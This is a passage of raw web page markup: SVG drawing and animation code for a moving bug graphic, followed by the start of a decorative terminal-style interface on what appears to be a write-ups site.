d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.73775,-232.188433)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(.909773 0 0 1 15.066 0)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.794-1.612-1.772-1.612h-28.799c-5.068,0-9.183,3.744-9.183,8.354c0,4.611,4.115,8.354,9.183,8.354h28.799c.978,0,1.772-.722,1.772-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-3.73987 0)" clip-rule="evenodd"><g id="evygBKlPSqr30_tr" transform="translate(139.737,232.188) rotate(45)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="translate(0 41.2501)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(.866025-.5 0.5 0.866025-104.112656 142.225892)" clip-rule="evenodd"><g id="evygBKlPSqr35_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="translate(0 92.3776)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(0 1.06393-1 0 368.186 180.854)" clip-rule="evenodd"><path d="M166.979,232.188c0-4.61-3.519-8.354-7.852-8.354h-24.05c-4.334,0-7.852,3.744-7.852,8.354c0,4.611,3.518,8.354,7.852,8.354h24.05c4.333,0,7.852-3.743,7.852-8.354Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-3.73987 120.809)" clip-rule="evenodd"><g id="evygBKlPSqr42_tr" transform="translate(139.737,232.188) rotate(30)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.736996,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g></g><rect id="bug-rect" x="0" width="362" height="380"></rect></g></g><animateMotion dur="30s" repeatCount="indefinite" rotate="auto-reverse" path="M -500 -500 M 500 -500 M -500 500 M 638 646 C 244 99 294 251 237 -148 C 229 -325 -43 -261 -138 -205 C -455 -57 -374 404 64 339 C 355 327 290 -273 -109 -143 C -336 -66 -356 16 -378 106 C -413 252 -319 649 -5 451 C 293 243 -326 155 -145 -36 C -45 -124 431 60 144 222 C -149 368 -258 13 17 -110 C 325 -218 203 200 34 181 C -419 161 37 637 635 649"></animateMotion></g></g></svg></div><!--]--></div></div><div class="cli-container" data-v-3d677fb4="" data-v-159c5976=""><div class="cli-output glow-border" data-v-159c5976="" data-v-3fc3914e=""><button class="close-output-btn glow-border" data-v-3fc3914e=""><img src="N-less%20RSA%20TheStray%CF%80rate_files/close_output.svg" alt="v" data-v-3fc3914e=""></button><div class="output-content hide-content" data-v-3fc3914e=""><span data-v-3fc3914e="">/writeups/ $ </span></div></div><div class="cli-prompt glow-border" data-v-159c5976=""><p data-v-159c5976="">
                 <span style="color: indianred;">root@</span>
